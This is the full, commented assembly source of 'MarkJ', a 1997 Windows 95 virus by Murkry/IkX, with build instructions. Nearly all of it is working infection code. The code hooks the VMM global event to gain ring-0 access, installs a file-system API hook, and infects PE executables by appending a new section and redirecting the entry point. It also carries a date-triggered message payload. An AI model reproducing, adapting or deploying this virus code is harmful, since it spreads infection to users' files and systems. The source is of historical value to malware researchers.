;
;                            MarkJ, by Murkry/IkX
;
;
;
;   Well this idea was very klunky (;) hi dv8) until I received and
; dissassembled the F---- harry 3 virus.  There I found that you could hook
; VxD functions (yay) using the QG manuver.  Well this made this virus easier,
; the main difference between QG's are this is larger and requires a section
; to be added the host; this is due to the method in how it gets tsr space its
; section header is set to Virtual address c0000000 - 400000 (bfc00000)
; which makes this section loaded at C0000000 an "unused" area  in sharedVxD
; memory this method will also work with the shared memory at 70000000 this
; method will leave that 1000h area in memory even after the orginal program
; is ended ;))
; (*added now b0z0 has already used this in one of his new viruses I am glad
; to see*)
;   As for the QG manuever well see his source code for more info but basically
; he uses a fixed location to find the vmm Device Descriptor Block in memory,
; then finds the schedule Global event entry point well you save this address
; and replace it with a pointer to your code which will then be at the ring0
; VxD land now you can call the ifsmger calls to do similiar to the mrKlunky
; and then repair the Global Event call and your set.  Yeah i know thats
; confusing read the code and figure it out you will learn more and feel better
; about yourself :)
;   Problems to overcome:
; well VxDcalls are coded in this fashion
;       int 20h
;       dd  00400032 ;    vxd vxdfunction
; which is replaced with
;       call [vxdfunction address]
; after the first time it is executed so the code can no longer be simply
; added to the host, QG fixed this by "patching" all these Dynalinks back to
; the int 20....  in Fharry, but he leaves the last one that is called at the
; final write to file which is converted to the call[...] b4 the write to file
; so this leaves one entry that is not patched Well this is sorta easy to fix
; in a number of methods I am choosing the easiest way which is to copy the
; code b4 the dynalink occur to an another location and when I write that copy
; of the code to the new host, another method would be to create the int 20's
; in a dynamic manner the first time this method might be nice for a mutating
; form of this type of virus as you can see VX technology is unlimited in what
; there is to explore in the Win95 enviroment.
;   hmm oh yeah the virus has a small payload on the 25th of june it will
; display a VWin32_SysErrorBox wishing Mark j a happy bday :)
;   For those who wonder MarkJ is my friend's son, who is the one who show me
; the wonderful world of Virii; JHB yea he is around!
; I know that since I show this to b0z0 he has taken this idea cleaned it up
; added new ideas so for some code that is more robust check out his article's
;
;
;
; Murkry


.Radix 16     

.386
;some restrictions
;I do not alter the Virtual address of the new section so the
; host host must load at a base address of a 400000h if this is not true do
; not infect
;to try to stay as a Win95 I check for file alignment as a 200h if not again
;do not infect
 
;  the "new" vxd area I create wants dd 0c0000040h
;for its characerstics or it fails out strange
; now this infects pe files that are name as .com files but get this
; the infect com will not run it hangs the system???? well this is just
;for demo purposes, rename the infected file to *.exe and it will work :)
;and lastly I did not add some check to insure that section directory has
;enough room in it ;) I leave these problems for the student to fix
;
; unlike most vxd's virii this requires Tasm and a debug script that sets the
; characterisics of the .DATA to 0c0000040h all set ;)
;but does not need special .lib's or the infamous ddk ;)
;while i have access to it I prefer to make my files without such  things
;that way I can use Tasm and not Masm
;
;Well  Virii eXplorers I hope this is an acceptable offering ;)
;thanks to QuantumG, DV8 for source and EXE's that help complete this
;
;Murkry 8/21/97

; Compiling:
;   tasm32 /ml /m3 markj,,;
;   tlink32 /Tpe /aa /c  /v markj,markj,, import32.lib,
; And then just make the DATA area to be loaded at BFC00000h with a hex editor

LoadAt          equ 0c0000000h
PeHeader        equ     offset Buffer - offset markj + LoadAt
.model flat
 
extrn           ExitProcess:PROC
extrn           AddAtomA:PROC 
;this is just the data area that I am using to build the code that will
;go in the 0c0000000h area the start of the host will be in the .code
; and in a real infection it will execute from the section dir..
.data                                   ;the data area
markj:
        
;first thing find the VMM uses a fixed location here
;yea this is just a modfied form of fuck harry by QG but
;why not
;maybe its possible to just scan for 'VMM '
;From 0C0010000 ?

StartOfVirus:
        ;ok first thing copy the virus to the end of our work and data error
        ;this way we have an ucorrupted version
        mov    esi, LoadAt
        mov    edi,offset DummyCode - Offset StartOfVirus + LoadAt
        mov    Ecx,offset EndVirus - Offset StartOfVirus
        rep    movsb

        mov    eax,0C000157Fh           ;pointer to one location???
        mov    ebx,[eax]                ;of the VMM dbb
        cmp    dword ptr [ebx+0C],0204D4D56h  ;'VMM '
        jne    ErrorExit                ;if not here get out
  
        mov    ebx,[ebx+30h]      
        ;find the Service table for th vmm
        ;now load the call_global_event address (I think)
        ;I have read the source to Fharry and I was right :)
        ;Sorta hook this Services
        lea    eax,[ebx+3Ch]      

        ;Store this value to restore it later
        mov    dword ptr ds:[0c0000000h + offset OrgIfsEntry- Offset markj],eax
                                                                ; 0c000e384h
        
        mov    eax,[eax]                

        mov    dword ptr ds:[offset VxDOff - Offset markj + LoadAt  ],eax
                                                                ; 402066
        lea    eax,dword ptr ds:[ offset NewHandler - Offset markj + LoadAt]
                                                      ;hook the code
        mov    [ebx+3Ch],eax           ;New Location of our Handler
                  
;Ok we should be set to return to the host

ErrorExit:  
         
RetToHost:
       inc      byte ptr ds:[offset CheckTsr - offset markj + LoadAt]

       Ret

;----------------------------------------------------------
;In Dos we would now be in the int Handler
; Here we are now in Ring 0 and are part of the VxD land ;)
; this is where we finish the QG manuever by hooking HookFSD 

NewHandler:
                pushad          
                                   

 ;restore the global event hook
                mov    eax,dword ptr ds:[VxDOff - offset markj +  LoadAt]

                ;mov    [00000000],eax
                db      0A3h
OrgIfsEntry     dd     0
        
        mov    word ptr ds:[offset VxDSeg -  Offset markj + LoadAt],cs
        call   CallIFSHook       

        popad
;---------------------------------------------------------

;        jmp    0028:00000000     
                db      0eah
VxDOff          dd      0401000h   
VxDSeg:         dw      0137h       
;---------------------------------------------------------------

VVxdCall1:
CallIFSHook:

        lea    eax,dword ptr ds:[offset NewFShook - Offset markj + LoadAt]
        push   edx
        push   eax

;this is sorta like hooking every int21 that handle file access in DOS
;This will add a FS hook now whenever a FSD is Called  this will be called
;first
;Call
;Tos = New Fsd Address to Install
;return
;EAX = Last FShook
ApiHook:                                ;4020dd
                int     20h
V1:
APIHOOKVXD      dd      00400067h
        ;  IFSMgr_Device_ID    0x00040 /* Installable File System Manager */
        ;  IFSMgr_Service  IFSMgr_InstallFileSystemApiHook         67

        add    esp,00000004       ;like a pop changes no regs but esp 
                                  ;some VxD's routines
                                  ;do not clean up after themselves
                                  ;Sometimes check docs for specs :))

        pop    edx                ; restore Edx
  ;Save the old FSHook so we can chain to it
        mov    dword ptr ds:[ offset OldFSD  - Offset markj + LoadAt],eax

;A little payload here if its the 6/25 then display the B-day mess
;just using the VMM Exec_VxD_Int to get the System date
;To be honest I could not find an easier way to do this!!!
;there are some VxD that give time and date but the date is how many
; seconds(I think) from some date in the 1980's this is easier and
; shows that accessing int 21 is still possible infact if QG is hooking the
; the GlobalEvent from the VMM it should be possible to hook the int21
; hanlder in a similiar fashion then some creative coding could make the
; Dos tsr and the VxD code very similiar....
; check for 6/25 if its the date show the message and set the flag
;
  
        mov     eax,00002A00h   ;get system date
        push    dword ptr 21h
        int     20h
V2      dd      0001008fh

        cmp     dx,0619
                ;6/25 in hex for those decimal heads ;)
        jne     ForGetIt
         
         
 ;this shows how one might use the VWin32_SysErrorBox
;To display a little message justing saying Hi to JHB's son who is the
; happy (?) reason jhb is not coding as much any more  I should add he
;did help with alot of this code 
        mov     ebx, LoadAt
        add     ebx, offset EBox - offset markj
        int     20h
V3      dd      002a001ah


ForGetIt:
 
        ret
;----------------------------------------------------
;all right we have "legal" hook into a FSD and the rest is the
;just the infection routine
NewFShook:
        push   ebp
        mov    ebp,esp
        sub    esp,00000020       

;-------------------------------------------------------
;Relative EBP this is what was passed I hope DV8 does not mind me
; using his docs to define this stuff
;00  - ebp
;04  - address of caller
;08  - adress of FSD Function
;0c  - Function ID
;10  - drive
;14  - Type of Resource
;18  - Code Page
;1C  - Pointer to IOREQ record
;        00 dw Lenght if user Buffer
;        02 db status Flag
;        03 db requests' user Id
;        04 dw file handle's System File number
;        06 dw Process ID
;   there is more I will copy or add as needed

        push    ebx
        push    esi
        push    edi

       ; mov    edi,00000000
;                db      0bfh           ;this gets us so edi points to our
;VirriOffVxD     dd      LoadAt         ;loc in memory

; Use this flag so we are not reentrant
 
        cmp     byte ptr ds:[offset Flag1 - offset markj +  LoadAt],01
        je      letOrginal
;Win95 always opens the file b4 running it so this checks and lets us 
;check if it  is opened
        cmp     dword ptr [ebp+0Ch],00000024h
        jne     letOrginal

;ok set our flag
        mov    byte ptr ds:[offset Flag1 - offset markj +  LoadAt],01
        pushad

        lea    esi,byte ptr ds:[offset FileName - offset markj +  LoadAt]

        mov    eax,[ebp+10h]            ;Primary Data buffer of the IOREQ
        cmp    al,0FFh
        je     NoNeedDriveLetter         
 

        add    al,40h                   ;this creates the c:
        mov    [esi],al                 ;
        inc    esi                      ;takes 1 byte
        mov    byte ptr [esi],':'       ;
        inc    esi                      ;takes two bytes

NoNeedDriveLetter:

        xor    eax,eax                
        push   eax                          ;character set

        mov    eax,000000FF                 ;max size of output buffer
        push   eax                          ;

        mov    ebx,[ebp+1Ch]                ;??? copies from Mr k and 
        mov    eax,[ebx+0Ch]                ;Fharry virus it seems to  
        add    eax,00000004                 ;to get the input file name
        push   eax                          ; which is in unicode

        mov    eax,esi                      ;where we want the output
        push   eax                          ;

UniToBcs:                                   ;ok do it
        int    20h                           
        dd      00400041h
        ;IFSMgr_Service  UniToBCSPath
        add     esp, 4*4                    ;need to clean up the stack
                                            ; dword size * how many push
                                            ;(paremeters)
        add     esi,eax
        mov     byte ptr [esi],00
        cmp     dword ptr [esi - 4],"MOC."
;       cmp     dword ptr [esi - 4],"EXE." ;hmm could just put this in to infect
                                           ;proper files ;>
        jne     ExitVVxD
;could add the get and save attributes stuff here as a Xercise for the student

        mov     Eax,0000D500h   ;create/open file
        xor     ecx,ecx
        lea     Esi,byte ptr ds:[offset FileName - offset markj +  LoadAt]
        mov     ebx,2           ;flags
        mov     edx,1

        call    VxDIFS          ;decide to combine this call
        ;int    20
        ;dd     00400032h
        ;IFSMgr_Service  IFSMgr_Ring0_FileIO

        jb      ExitVVxD   ;error opening the file
        mov    ebx,eax       ;file handle

;Read File open with read write d6
;3c is the location of the dword pter to the PE/NE part

        mov     ecx,00000004             ;how much
        mov     edx, 03Ch                ;where to read from
        mov     eax,0000D600h            ;read from file
        lea     esi,byte ptr ds:[offset PEPtr - offset markj +  LoadAt]
                                         ;where to read to

        call    VxDIFS   
        ;int    20h
        ;dd     00400032h
       ;IFSMgr_Service  IFSMgr_Ring0_FileIO

        mov    ecx,400h
        mov    edx,dword ptr ds:[offset PEPtr - offset markj +  LoadAt]
                                         ;use as a pointer
        mov    eax,0000D600h
        lea    esi,byte ptr ds:[offset Buffer - offset markj +  LoadAt]
                                         ;where to read to

        call    VxDIFS   
        ;int    20h
        ;dd     00400032h
       ;IFSMgr_Service  IFSMgr_Ring0_FileIO                     32
       ;check for the PE
;Read in the first 1k of info from the PE header on
        cmp    dword ptr [esi],00004550h        ;00,'EP'
        jne    CloseFile

;Alright!! its a PE file now check if infected
;use the user defined 2 words at 44h = Murk
;figure file size
;figure amout to add
;fix header and write end and then write header
;all offsets should be off the offset Buffer - offset markj + LoadAt 
; called PeHeader

;Lets do some checks if any fail get out

        cmp     dword ptr ds:[PeHeader + 44],'kruM'      ;user define
        je      CloseFile
;Well not infected with MarkJ1 virus

        cmp     dword ptr ds:[PeHeader + 34h ],00400000h          ;base image
        jne     CloseFile
;for this example we only want the base image to be 400000h

        cmp     dword ptr ds:[PeHeader + 3ch],200h          ;file alignment
        jne     CloseFile
;and lastly check the file alignment if 200 we are set 

 
        xor     eax,eax
        mov     ax,word ptr ds:[PeHeader + 6] ;how many sections
        mov     ecx,28h                       ;section size
        mul     ecx

        mov     edi,eax                       ;New Section Entry
        add     edi,PeHeader + 0f8h                      ;add Pe header size

        push    edi             ;location in PeHeader of new section header

        mov     esi, offset SectName - offset markj +  LoadAt
        mov     ecx, offset EndVirus - offset SectName
        rep     movsb

        pop     edi

;get file size
        mov     eax,0d800h              ;get file size

       call    VxDIFS
       ; int    20h
       ; dd     00400032h
       ;IFSMgr_Service  IFSMgr_Ring0_FileIO                     
       ;jc for error

       mov     dword ptr ds:[offset FileSize - offset markj +  LoadAt],Eax

       push     eax             ;save the size
       pop      edx             ;get it in edx
       push     edx             ;save again 
       add      eax,0200h
       shr      eax,09h         ;make it the 200h size 
       shl      eax,09h         ;

       pop      ecx
       sub      eax,ecx
       xchg     eax,ecx
       
;Extend the file to a 200 file alignment
        
       cmp      ecx,0200h 
       jz       AtAlignment
       add      dword ptr ds:[offset FileSize - offset markj +  LoadAt],Ecx

       mov      eax,0000d601h           ;write to file
       mov      esi,0c0000000h
       call    VxDIFS
       ;int      20h
       ;dd       00400032h     ;edx is telling us where to write to in the file
AtAlignment:

       mov      edx, dword ptr ds:[offset FileSize - offset markj +  LoadAt]
       mov      dword ptr ds:[edi + 14h ],edx

       mov      ecx,offset EndVirus - offset StartOfVirus
       mov      eax,0000d601h           ;write to file
       mov      esi,offset DummyCode - Offset StartOfVirus + LoadAt  
        call    VxDIFS
        ;int      20h
        ;dd       00400032h       ;edx is telling us where to write to

;ok fix the header and write it back
;fix marker
        mov     dword ptr ds:[PeHeader + 44h],'kruM'      ;user define
;fix Eip
        mov     eax,edi
        sub     eax,PeHeader
        add     eax,dword ptr ds:[offset PEPtr - offset markj +  LoadAt]
        add     eax,28h   ;<----NewEip
        mov     dword ptr ds:[edi + 28h + 1],eax
        push    eax     ;save the new eip

        mov     eax,dword ptr ds:[PeHeader + 28]
        mov     dword ptr ds:[edi + offset OldEipRva - offset SectName],eax

        pop     eax
        mov     dword ptr ds:[PeHeader + 28],eax   ;set the new eip


;fix section count
        inc    word ptr ds:[PeHeader + 6]
 
        mov    ecx,400h
        mov    edx,dword ptr ds:[offset PEPtr - offset markj +  LoadAt]
                                                    ;use as a pointer
        lea    esi,byte ptr ds:[offset Buffer - offset markj +  LoadAt]
                                                    ;where to read to
        mov    eax,0000d601h           ;write to file
        call    VxDIFS
       ; int      20h
       ; dd       00400032h       ;edx is telling us where to write to


CloseFile:
         mov    eax,0000d700h

         call    VxDIFS
         ;int    20h                              ;402500h
         ;dd     00400032h
 ;IFSMgr_Service  IFSMgr_Ring0_FileIO

 

ExitVVxD:
        Popad
;Restore our flag so we can infect the next file
        mov     byte ptr ds:[offset Flag1 - offset markj +  LoadAt],0

letOrginal:

        mov    eax,[ebp+1CH]                     ;040250eh
        push   eax
        mov    eax,[ebp+18H]
        push   eax
        mov    eax,[ebp+14H]
        push   eax
        mov    eax,[ebp+10H]
        push   eax
        mov    eax,[ebp+0CH]
        push   eax
        mov    eax,[ebp+08H]
        push   eax

        ;mov    eax,00000000
                db      0b8h
OldFSD          dd      0
        call   [eax]

        add    esp,00000018
        pop    edi
        pop    esi
        pop    ebx
        leave                                   ;402533h
        ret

;********************************************
VxDIFS:
        int    20h                              ;402500h
        dd     00400032h
        ret

;********************************************

MFlag           db      ?
Flag1           db      ?

EBox            dd   ?
butt1           dw   0
butt2           dw   8001
butt3           dw   0
TitleOff        dd   offset TitleEB - offset markj +0c0000000h
TextOff         dd   offset TextEB - offset markj +0c0000000h

TitleEB         db      'Happy Birth Day to Mark J ',0
TextEB          db      'From Murkry',0

;-----------------------------------------------------------

SectName        db      "MarkJ_I "
Physadd         dd      offset EndVirus - offset StartOfVirus
VirtualAdd      dd      0c0000000h - 400000h  ;bfc00000
SizeRawData     dd      offset EndVirus - offset StartOfVirus
PntrRawData     dd      0                           ;will be set at infection
PnterReloc      dd      ?
PnterLine       dd      ?
                dw      ?
                dw      ?
Character       dd      0c0000040h

       ;sub      eax, offset HOST - 400000h
                db       2dh
NewEipRva       dd    offset HOST - 400000h  

       cmp      eax,400000h
       jne      GetOut
       cmp      byte ptr ds:[offset CheckTsr - offset markj + LoadAt],0
       jne      GetOut

       ;EAX     ;current base address
       pushad
       call     DoNothing
DoNothing:
       pop      eax
       add      eax,0bh
       push     eax
       push     0c0000000h
       ret
Here:
       popad
        
GetOut:
        
       ;add     eax, offset return - 400000h
                db       05h
OldEipRva       dd       offset return - 400000h

       jmp     eax
;----------------------------------------------------------------



EndVirus:
FileName        db      100 dup(00)    ;holds the file name

 
PEPtr           dd      0
FileSize        dd      0
Buffer          db      400h dup(00)

CheckTsr        db      00

DummyCode:

;--------------------------------------------------------------------
.code                                   ;executable code starts here

HOST:
       ;sub      eax, offset HOST - 400000h
                db       2dh
NewEipRva1       dd    offset HOST - 400000h  

       cmp      eax,400000h
       jne      GetOut1
       cmp      byte ptr ds:[offset CheckTsr - offset markj + LoadAt],0
       jne      GetOut1

       ;EAX     ;current base address
       pushad
       call     DoNothing1
DoNothing1:
       pop      eax
       add      eax,0bh
       push     eax
       push     0c0000000h
       ret
Here1:
       popad
        
GetOut1:
        
       ;add     eax, offset return - 400000h
                db       05h
OldEipRva1      dd       offset return - 400000h

       jmp     eax
;--------------------------------------------------

return:
        push    LARGE -1
        call    ExitProcess              

        end     HOST
